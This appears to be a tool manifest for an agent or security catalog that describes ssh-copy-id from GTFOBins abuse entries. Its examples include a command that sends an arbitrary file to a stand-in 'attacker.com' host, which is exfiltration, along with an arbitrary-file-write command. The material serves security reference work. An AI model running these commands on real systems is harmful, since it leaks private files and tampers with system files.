---
id: network-ssh-ssh-copy-id
namespace: network:ssh:ssh-copy-id
name: ssh-copy-id
description: "Install SSH public keys on remote hosts; can write to authorized_keys and spawn shells."
author: GTFOBins
version: 1.0.0
capabilities:
- system.file.read
- system.file.write
platforms:
- linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
- arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - shell-access
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: none
  disk_io: low
allowed-tools:
- ssh-copy-id
parameters: []
features: []
execution:
  template: ssh-copy-id
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Read arbitrary files (sudo, unprivileged)
  command: ssh-copy-id -f -i /path/to/input-file.pub user@attacker.com
- description: Write to arbitrary files (sudo, unprivileged)
  command: ssh-copy-id -f -i /path/to/input-file.pub -t /path/to/output-file user@host
references:
- label: GTFOBins
  url: https://gtfobins.github.io/gtfobins/ssh-copy-id/
techniques:
- collection
- exfiltration
install:
- method: apt
  package_name: openssh-client
  commands:
  - apt-get install -y openssh-client
---


# ssh-copy-id

ssh-copy-id is a command-line utility. Install SSH public keys on remote servers; can also read arbitrary files, write to arbitrary files.
